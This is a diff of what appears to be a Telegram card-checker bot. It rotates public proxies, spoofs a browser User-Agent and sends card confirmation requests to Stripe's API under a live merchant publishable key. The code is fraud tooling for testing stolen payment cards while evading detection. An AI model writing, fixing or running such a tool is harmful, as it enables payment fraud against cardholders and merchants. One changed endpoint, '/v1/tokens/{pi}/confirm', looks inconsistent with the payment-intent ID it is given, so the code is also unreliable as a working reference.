@@ -21,7 +21,7 @@ bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
 dp = Dispatcher(bot)
 
 ###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
-r = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=20&country=all&ssl=all&anonymity=all&simplified=true').text
+r = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc&filterPort=443&country=US&google=true&anonymityLevel=elite&anonymityLevel=anonymous&anonymityLevel=transparent').text
 res = r.partition('\n')[0]
 proxy = {"http": f"http://{res}"}
 session = requests.session()
@@ -137,9 +137,10 @@ async def ch(message: types.Message):
             )
     # get guid muid sid
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/93.0.957.0",
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/x-www-form-urlencoded"
+      
     }
     s = session.post("https://m.stripe.com/6",
                      headers=headers)
@@ -191,7 +192,7 @@ async def ch(message: types.Message):
       "use_stripe_sdk": "true",
       "webauthn_uvpa_available": "true",
       "spc_eligible": "false",
-      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
+      "key": "pk_live_GWQnyoQBA8QSySDV4tPMyOgI",
       "client_secret": client
     }
     
@@ -204,7 +205,7 @@ async def ch(message: types.Message):
       "Accept-Language": "en-US,en;q=0.9"
     }
     
-    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
+    rx = session.post(f"https://api.stripe.com/v1/tokens/{pi}/confirm",
                      data=load, headers=header)
     res = rx.json()
     msg = res["error"]["message"]
